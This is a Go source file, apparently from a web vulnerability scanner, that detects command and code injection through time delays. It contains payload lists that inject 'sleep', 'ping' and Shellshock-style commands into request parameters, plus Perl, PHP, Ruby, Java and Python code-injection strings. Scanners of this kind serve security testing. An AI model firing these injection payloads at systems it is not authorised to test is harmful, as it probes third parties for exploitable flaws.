package code_exec

import (
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
)

// extensionMap maps file extensions to programming languages.
// Used to select language-specific command injection payloads.
var extensionMap = map[string]string{
	".php":    "php",
	".php3":   "php",
	".php4":   "php",
	".php5":   "php",
	".phtml":  "php",
	".pl":     "perl",
	".cgi":    "perl",
	".jsp":    "java",
	".do":     "java",
	".action": "java",
	".rb":     "ruby",
	".asp":    "any",
	".aspx":   "any",
	".py":     "python",
}

// genericUnixPayloads are command injection payloads for Unix-like systems.
// Sleep duration matches delaySeconds.
var genericUnixPayloads = []string{
	"; sleep 10",
	"| sleep 10",
	"$(sleep 10)",
	"`sleep 10`",
	"() { :;}; /bin/sleep 10", // Shellshock
	"& sleep 10 &",
	"|| sleep 10",
	"&& sleep 10",
	`'";sleep 10;#`,
	`%0asleep 10%0a`,
}

// windowsPayloads are command injection payloads for Windows systems.
var windowsPayloads = []string{
	"& ping -n 11 127.0.0.1",
	"| ping -n 11 127.0.0.1",
	"& timeout /T 10 /NOBREAK",
}

// langPayloads maps language to specific command injection payloads.
var langPayloads = map[string][]string{
	"perl":   {"/bin/sleep 10|"},
	"php":    {`"; sleep(10);"`},
	"ruby":   {"#{`sleep 10`}"},
	"java":   {"${T(java.lang.Thread).sleep(10000)}"},
	"python": {"__import__('time').sleep(10)"},
}

// Time-delay detection tuning. Picked to keep false positives rare without
// hammering the target with absurd sleep values (no `sleep 100`).
//
//   - delaySeconds:       payload sleep duration AND minimum response time
//     to count a probe as "slow". 10s comfortably
//     exceeds typical backend latency / network jitter.
//   - baselineMaxSeconds: an unfuzzed (baseline) probe must complete under
//     this. Catches "server is just slow today" cases.
//   - confirmSlowRounds:  number of times the slow payload must trigger
//     (initial + this many confirmations). 4 total
//     independent slow probes before declaring vuln.
//
// Note: pkg/http.Requester.Execute returns duration as whole seconds
// (int(time.Since(start).Seconds())), so all comparisons here operate at
// 1-second granularity. That's coarse but adequate for a 10s threshold.
const (
	delaySeconds       = 10
	baselineMaxSeconds = 5
	confirmSlowRounds  = 3
)

type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
		rhm: dedup.LazyRHM("code_exec", dedup.Option{
			Method:                 true,
			Host:                   true,
			Path:                   true,
			InjectingParamName:     true,
			InjectingParamPosition: true,
			AllParamKeys:           true,
		}),
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return results, nil
	}

	// Create all insertion points (uses cached provider when available)
	points, err := scanCtx.GetInsertionPoints(ctx.Request().Raw(), ctx.Request().ID(), true)
	if err != nil {
		return results, errors.Wrap(err, "failed to create insertion points")
	}

	// Filter out already checked insertion points
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		points = rhm.GetNotCheckedInsertionPoints(urlx, ctx.Request(), points)
	}
	if len(points) == 0 {
		return results, nil
	}

	// Get payloads based on file extension
	payloads := getPayloadsForExtension(ctx.Request().Raw())

ipScan:
	for _, ip := range points {
		// Build a baseline request (same shape, original parameter value)
		// to detect "server is just slow today" cases. Built once per IP
		// and reused across payload attempts.
		baselineReq, baselineOk := buildBaselineRequest(ctx, ip)

		for _, payload := range payloads {
			// Build fuzzed request with payload
			fuzzedRaw := ip.BuildRequest([]byte(payload))

			// Parse the fuzzed raw request
			fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
			if err != nil {
				continue
			}

			// Copy HttpService from original request
			fuzzedReq = fuzzedReq.WithService(ctx.Service())

			// Probe 1: fuzzed must be slow.
			isSlow, sendErr := sendTimedRequest(fuzzedReq, httpClient)
			if sendErr != nil || !isSlow {
				continue
			}

			// Probe 2: baseline must be fast. Skips if baseline build failed.
			if baselineOk {
				baselineSlow, err := isResponseSlow(baselineReq, httpClient, baselineMaxSeconds)
				if err != nil || baselineSlow {
					// Server is generically slow; treat the slow fuzzed
					// probe as inconclusive and move on to the next payload.
					continue
				}
			}

			// Probes 3..N: confirm fuzzed stays slow across multiple sends.
			allConfirmed := true
			for range confirmSlowRounds {
				isSlow, sendErr = sendTimedRequest(fuzzedReq, httpClient)
				if sendErr != nil || !isSlow {
					allConfirmed = false
					break
				}
			}

			if allConfirmed {
				results = append(results, &output.ResultEvent{
					URL:              urlx.String(),
					Request:          string(fuzzedRaw),
					FuzzingParameter: ip.Name(),
					ExtractedResults: []string{payload},
				})
				continue ipScan
			}
		}
	}

	return results, nil
}

// buildBaselineRequest constructs a request shaped like the fuzzed one but
// with the original parameter value, used as a "server is fast" baseline.
// Returns ok=false if construction fails (caller should skip the baseline
// check rather than fail the whole scan).
func buildBaselineRequest(ctx *httpmsg.HttpRequestResponse, ip httpmsg.InsertionPoint) (*httpmsg.HttpRequestResponse, bool) {
	raw := ip.BuildRequest([]byte(ip.BaseValue()))
	req, err := httpmsg.ParseRawRequest(string(raw))
	if err != nil {
		return nil, false
	}
	return req.WithService(ctx.Service()), true
}

// isResponseSlow sends req and reports whether the response took at least
// thresholdSeconds (whole seconds, matching the resolution of the underlying
// http.Requester).
func isResponseSlow(req *httpmsg.HttpRequestResponse, httpClient *http.Requester, thresholdSeconds int) (bool, error) {
	resp, duration, err := httpClient.Execute(req, http.Options{IgnoreTimeoutTracking: true})
	defer func() {
		if resp != nil {
			resp.Close()
		}
	}()
	if err != nil {
		if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
			return false, nil
		}
		if strings.Contains(err.Error(), "timeout awaiting response headers") {
			return true, nil
		}
		return false, err
	}
	return duration >= thresholdSeconds, nil
}

// getPayloadsForExtension returns payloads based on file extension.
// Always includes generic Unix and Windows payloads,
// plus language-specific payloads if extension matches.
func getPayloadsForExtension(request []byte) []string {
	payloads := make([]string, 0, len(genericUnixPayloads)+len(windowsPayloads)+5)

	// Always include generic payloads
	payloads = append(payloads, genericUnixPayloads...)
	payloads = append(payloads, windowsPayloads...)

	// Get file extension
	ext, err := httpmsg.GetExtension(request)
	if err != nil || ext == "" {
		return payloads
	}

	// Normalize extension to lowercase
	ext = strings.ToLower(ext)

	// Look up language for this extension
	lang, ok := extensionMap[ext]
	if !ok {
		return payloads
	}

	// Add language-specific payloads
	if langSpecific, ok := langPayloads[lang]; ok {
		payloads = append(payloads, langSpecific...)
	}

	return payloads
}

// sendTimedRequest sends a request and checks if response took >= delaySeconds.
func sendTimedRequest(req *httpmsg.HttpRequestResponse, httpClient *http.Requester) (bool, error) {
	timeout := false
	resp, duration, err := httpClient.Execute(req, http.Options{IgnoreTimeoutTracking: true})
	if err != nil {
		if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
			return false, nil
		}
		if strings.Contains(err.Error(), "timeout awaiting response headers") {
			timeout = true
		}
	}

	defer func() {
		if resp != nil {
			resp.Close()
		}
	}()

	if duration >= delaySeconds || timeout {
		return true, nil
	}
	return false, nil
}
